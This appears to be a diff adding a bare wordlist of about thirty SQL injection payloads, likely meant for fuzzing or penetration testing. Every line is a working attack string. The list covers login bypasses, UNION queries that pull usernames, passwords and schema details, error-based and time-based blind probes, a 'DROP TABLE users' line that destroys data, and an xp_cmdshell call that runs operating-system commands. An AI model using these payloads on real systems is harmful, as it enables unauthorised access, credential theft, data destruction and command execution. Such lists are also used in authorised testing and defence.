@@ -1,0 +1,30 @@
+' OR 1=1--
+' OR '1'='1
+' UNION SELECT 1,2,3--
+'; DROP TABLE users--
+' AND 1=0 UNION SELECT username,password FROM users--
+1' ORDER BY 1--
+1' ORDER BY 10--
+' OR 1=1#
+admin' --
+admin' #
+' /*!50000OR*/ 1=1--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION SELECT null,table_name FROM information_schema.tables--
+' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--
+1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+1' AND SLEEP(5)--
+1' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
+'; WAITFOR DELAY '0:0:5'--
+1 AND 1=1
+1 AND 1=2
+' OR 'a'='a
+') OR ('1'='1
+')) OR ((1=1
+1; EXEC xp_cmdshell('whoami')--
+' HAVING 1=1--
+' GROUP BY id HAVING 1=1--
+' OR EXISTS(SELECT * FROM users)--
+1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--
+' OR json_extract(data, '$.admin')=1--
